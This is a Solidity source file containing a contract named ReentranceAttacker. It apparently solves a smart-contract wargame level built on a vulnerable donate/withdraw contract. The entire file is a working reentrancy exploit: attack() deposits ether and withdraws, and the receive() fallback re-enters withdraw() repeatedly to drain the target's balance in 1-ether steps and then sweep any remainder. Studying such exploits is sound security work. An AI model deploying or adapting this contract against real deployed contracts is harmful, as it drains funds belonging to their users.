// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttacker {
    error ReentranceAttacker__MustNotBeZero();
    error ReentranceAttacker__InsufficientFunds();

    IReentrance public reentrance;

    uint256 private constant TARGET_AMOUNT = 1 ether;

    constructor(address _reentrance) {
        reentrance = IReentrance(_reentrance);
    }

    receive() external payable {
        uint256 targetBalance = address(reentrance).balance;
        if (targetBalance >= TARGET_AMOUNT) {
            reentrance.withdraw(TARGET_AMOUNT);
            // Should in case of left over balance
        } else if (targetBalance < TARGET_AMOUNT) {
            reentrance.withdraw(address(reentrance).balance);
        }
    }

    function attack() external payable {
        if (msg.value == 0) {
            revert ReentranceAttacker__MustNotBeZero();
        }
        if (msg.value < TARGET_AMOUNT) {
            revert ReentranceAttacker__InsufficientFunds();
        }
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }
}
